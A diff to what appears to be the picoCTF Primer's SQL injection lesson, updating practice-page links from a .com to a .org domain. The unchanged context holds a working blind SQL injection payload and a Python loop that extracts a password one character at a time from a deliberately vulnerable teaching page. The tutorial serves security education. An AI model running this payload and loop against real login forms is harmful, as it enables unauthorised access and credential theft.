@@ -164,7 +164,7 @@ The resultant query would be:
 
 Which is a perfectly valid query that will return the whole table. Use what you just learn here to return all the users:
 
-https://primer.picoctf.com/vuln/web/basicsql.php[https://primer.picoctf.com/vuln/web/basicsql.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/basicsql.php[https://primer.picoctf.org/vuln/web/basicsql.php, window="_blank"]
 
 
 This kind of vulnerability it is rarely present in applications. One that is more common, is the blind sql injection.
@@ -175,7 +175,7 @@ In this kind of vulnerability, the application does not return all the data to y
 
 To illustrate this, we are going to attack the following page:
 
-https://primer.picoctf.com/vuln/web/blindsql.php[https://primer.picoctf.com/vuln/web/blindsql.php, window="_blank"]
+https://primer.picoctf.org/vuln/web/blindsql.php[https://primer.picoctf.org/vuln/web/blindsql.php, window="_blank"]
 
 If we input our previous injection in the password field:
 
@@ -242,7 +242,7 @@ accum = ""
 for i in range(40):
   for letter in printable:
     accum += letter
-    r = requests.post("https://primer.picoctf.com/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
+    r = requests.post("https://primer.picoctf.org/vuln/web/blindsql.php?&username=WeDontCare&password=' or '"
     + letter+"'=( select substr(binary password,"+str(i)+",1) from pico_blind_injection where id=1 ) and ''= '")
     if 'NOTHING FOUND...' in r.text:
       accum = accum[:-1]
